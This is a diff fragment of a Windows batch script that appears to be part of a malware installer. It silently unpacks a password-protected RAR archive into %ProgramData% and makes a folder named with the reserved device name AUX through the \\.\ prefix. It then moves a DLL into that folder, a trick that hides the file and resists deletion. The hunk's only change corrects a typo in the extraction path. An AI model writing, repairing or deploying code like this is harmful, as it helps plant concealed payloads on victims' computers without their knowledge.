@@ -18,7 +18,7 @@ for %a in (%processList%) do (
 )
 
 
-"%ProgramData%\0\UnRAR.exe" x -y -p741258963 "%ProgramData%\O\O.rar" "%ProgramData%\O\"
+"%ProgramData%\O\UnRAR.exe" x -y -p741258963 "%ProgramData%\O\O.rar" "%ProgramData%\O\"
 mkdir \\.\%ProgramData%\AUX..\
 
 move /Y "%ProgramData%\dist\Icon.dll" "\\.\%ProgramData%\AUX..\"
